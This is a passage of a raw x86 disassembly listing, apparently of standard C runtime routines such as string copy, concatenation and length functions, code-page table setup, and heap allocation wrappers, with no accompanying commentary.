  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
